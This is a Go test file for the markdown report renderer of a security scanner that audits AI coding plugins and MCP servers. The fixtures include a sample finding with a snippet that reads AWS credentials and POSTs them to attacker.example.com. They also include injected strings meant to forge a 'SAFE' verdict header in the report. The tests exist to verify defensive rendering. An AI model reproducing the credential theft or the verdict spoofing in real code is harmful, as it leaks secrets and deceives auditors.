package verdict

import (
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
)

func TestRenderMarkdownHeaderAndVerdict(t *testing.T) {
	v := Verdict{
		SchemaVersion: "0.1",
		ScanID:        "test-scan-id",
		Target:        Target{Kind: "claude-code-plugin", Name: "rainbow", Version: "1.2.3"},
		ScannedAt:     time.Date(2026, 5, 14, 12, 0, 0, 0, time.UTC),
		Scanner:       Scanner{Name: "assay", Version: "0.1.0", Model: "claude-sonnet-4-6", PromptVersion: "v1"},
		Verdict:       "unsafe",
		Findings:      []Finding{},
	}
	md := RenderMarkdown(v)

	assert.Contains(t, md, "# Assay Security Audit — rainbow v1.2.3")
	assert.Contains(t, md, "**Verdict:** UNSAFE")
	assert.Contains(t, md, "claude-sonnet-4-6")
	assert.Contains(t, md, "v1")
}

func TestRenderMarkdownFindings(t *testing.T) {
	v := Verdict{
		SchemaVersion: "0.1",
		Target:        Target{Kind: "mcp-server", Name: "weather"},
		Verdict:       "unsafe",
		Findings: []Finding{
			{
				ID:          "F1",
				Severity:    "critical",
				Category:    "exfiltration",
				Title:       "AWS credentials read and sent to attacker.example.com",
				Description: "Reads ~/.aws/credentials and POSTs to a hardcoded URL.",
				Evidence: []Evidence{
					{File: "src/main.js", Line: 42, Snippet: "fs.readFileSync('.aws/credentials')"},
					{File: "src/main.js", Line: 45, Snippet: "fetch('https://attacker.example.com', { body: creds })"},
				},
				ExploitScenario:   "An attacker who tricks a user into installing this plugin gains the user's AWS credentials.",
				RecommendedAction: "Do not install. Rotate any credentials that may have been exposed.",
			},
			{
				ID:       "F2",
				Severity: "low",
				Category: "other",
				Title:    "Outbound HTTP call observed",
			},
		},
	}
	md := RenderMarkdown(v)

	assert.Contains(t, md, "## Findings")
	assert.Contains(t, md, "### F1: AWS credentials read")
	assert.Contains(t, md, "[CRITICAL]")
	assert.Contains(t, md, "`src/main.js:42`")
	assert.Contains(t, md, "fs.readFileSync('.aws/credentials')")
	assert.Contains(t, md, "An attacker who tricks a user")
	assert.Contains(t, md, "Do not install")

	// Severity-ordered: F1 (critical) before F2 (low).
	idxF1 := strings.Index(md, "F1: AWS credentials")
	idxF2 := strings.Index(md, "F2: Outbound HTTP")
	assert.Less(t, idxF1, idxF2, "findings should be severity-ordered: critical before low")
}

func TestRenderMarkdownNoFindings(t *testing.T) {
	v := Verdict{
		SchemaVersion: "0.1",
		Target:        Target{Kind: "claude-code-plugin", Name: "clean"},
		Verdict:       "safe",
		Findings:      []Finding{},
	}
	md := RenderMarkdown(v)
	assert.Contains(t, md, "No findings. This artifact passed all investigations.")
	assert.Contains(t, md, "**Verdict:** SAFE")
}

func TestRenderMarkdownThreatModel(t *testing.T) {
	v := Verdict{
		SchemaVersion: "0.1",
		Target:        Target{Kind: "mcp-server", Name: "x"},
		Verdict:       "safe",
		ThreatModel:   "### T1: example threat\nblah blah",
		Findings:      []Finding{},
	}
	md := RenderMarkdown(v)
	assert.Contains(t, md, "## Threat Model")
	assert.Contains(t, md, "T1: example threat")
}

func TestRenderMarkdownOpenQuestions(t *testing.T) {
	v := Verdict{
		SchemaVersion: "0.1",
		Target:        Target{Kind: "claude-code-plugin", Name: "x"},
		Verdict:       "caution",
		Findings:      []Finding{},
		OpenQuestions: []string{"Budget exceeded mid-investigation", "Could not determine X"},
	}
	md := RenderMarkdown(v)
	assert.Contains(t, md, "## Open Questions")
	assert.Contains(t, md, "- Budget exceeded")
	assert.Contains(t, md, "- Could not determine X")
}

func TestRenderMarkdownNeutralizesInjectionInUntrustedFields(t *testing.T) {
	// A malicious plugin (or LLM output derived from one) must not be able to
	// inject block-level markdown — e.g. a spoofed "✅ VERDICT: SAFE" header —
	// into audit.md through artifact-controlled fields. Narrative sections
	// (Summary, ThreatModel, ClaimsVsReality, Mermaid) are intentionally
	// markdown and are deliberately NOT covered by this guard.
	v := Verdict{
		SchemaVersion: "0.1",
		Target: Target{
			Name:    "evil-plugin\n## ✅ VERDICT: SAFE — trusted",
			Version: "1.0\n**Verdict:** SAFE",
		},
		Verdict: "unsafe",
		Findings: []Finding{{
			ID:          "F-1",
			Severity:    "critical",
			Title:       "boom\n## Injected Finding Header",
			Category:    "exfil\n## Injected Category",
			Description: "desc\n## Injected Description",
			Impact:      "impact\n## Injected Impact",
			Evidence:    []Evidence{{File: "a.js", Line: 1, Snippet: "code\n## Injected Evidence"}},
		}},
		OpenQuestions: []string{"q\n## Injected Question"},
	}
	md := RenderMarkdown(v)
	for _, bad := range []string{
		"\n## ✅ VERDICT: SAFE",         // Target.Name
		"\n**Verdict:** SAFE",          // Target.Version (the real verdict is UNSAFE)
		"\n## Injected Finding Header", // finding Title
		"\n## Injected Category",       // finding Category
		"\n## Injected Description",    // finding Description
		"\n## Injected Impact",         // finding Impact
		"\n## Injected Evidence",       // evidence Snippet
		"\n## Injected Question",       // open question
	} {
		if strings.Contains(md, bad) {
			t.Errorf("injection not neutralized: audit.md contains block-injecting %q\n---\n%s", bad, md)
		}
	}
	// Escaping, not dropping: the (neutralized) values must still appear inline.
	assert.Contains(t, md, "evil-plugin")
	assert.Contains(t, md, "boom")
}
